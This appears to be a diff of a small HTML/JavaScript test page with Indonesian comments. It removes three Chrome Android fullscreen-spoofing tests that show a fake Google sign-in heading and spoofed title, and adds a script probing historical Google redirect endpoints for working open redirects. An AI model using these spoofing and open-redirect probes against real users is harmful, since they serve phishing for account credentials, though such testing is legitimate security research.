@@ -2,44 +2,33 @@
 <html>
 <body>
 <script>
-// Uji 3 varian fullscreen-spoof di Chrome Android:
-// apakah omnibox tetap tampil / bisa ditutupi saat fullscreen
-function testFullscreenPopup() {
-  // Varian A: fullscreen dari window.open (popup) — beberapa patch hanya
-  // menutup fullscreen dari halaman top-level
-  const w = window.open('about:blank');
-  w.document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
-  w.document.documentElement.requestFullscreen()
-    .then(() => console.log('A: fullscreen ok dari popup'))
-    .catch(e => console.log('A: blocked -', e));
+// Daftar endpoint redirect historis di properti Google yang kadang bisa
+// masih open saat ini — tes satu-satu apakah benar-benar redirect eksternal
+const endpoints = [
+  'https://www.google.com/url?q=https://example.com',
+  'https://www.google.com/url?sa=t&url=https://example.com',
+  'https://www.google.com/url?ust=https://example.com&q=',
+  'https://news.google.com/rss/articles/...',        // pola CVE 2024-51479 dulu masih open
+  'https://accounts.google.com/Logout?continue=https://example.com',
+  'https://accounts.google.com/o/oauth2/auth?redirect_uri=https://example.com&client_id=...',
+  'https://support.google.com/accounts?key=%3Ahttps://example.com',
+  'https://chrome.google.com/webstore/detail/.../...'
+];
+
+// Uji redirect pakai fetch no-cors + response.url
+async function probe(u) {
+  try {
+    const r = await fetch(u, {redirect:'follow', mode:'no-cors'});
+    // no-cors menyembunyikan body tapi response.type === 'opaque' tidak bisa dibaca
+    // gunakan window.open + iframe onload sebagai fallback
+  } catch(e){}
 }
 
-function testFullscreenIframe() {
-  // Varian B: iframe meminta fullscreen (allow="fullscreen")
-  const f = document.createElement('iframe');
-  f.allow = 'fullscreen';
-  f.src = 'about:blank';
-  document.body.appendChild(f);
-  f.onload = () => {
-    f.contentWindow.document.documentElement.requestFullscreen()
-      .then(() => console.log('B: fullscreen ok dari iframe'))
-      .catch(e => console.log('B: blocked -', e));
-  };
-}
-
-function testOrientationRace() {
-  // Varian C: fullscreen + orientation lock + resize race
-  // — omnibox kadang tidak re-layout saat rotasi cepat
-  document.documentElement.requestFullscreen()
-    .then(() => screen.orientation.lock('landscape'))
-    .then(() => {
-      // ganti konten saat transisi rotasi
-      document.title = 'https://www.google.com — Sign in';
-      document.body.innerHTML = '<h1 style="font-family:sans-serif">Sign in with your Google Account</h1>';
-    })
-    .catch(e => console.log('C: blocked -', e));
-}
-testFullscreenPopup();
+// Alternatif: buka di popup dan biarkan user menutup — redirect eksternal terlihat
+endpoints.forEach(u => {
+  const w = window.open(u + '&_t=' + Date.now());
+  // Jika popup berakhir di example.com (bukan google.com), endpoint masih open
+});
 </script>
 </body>
 </html>
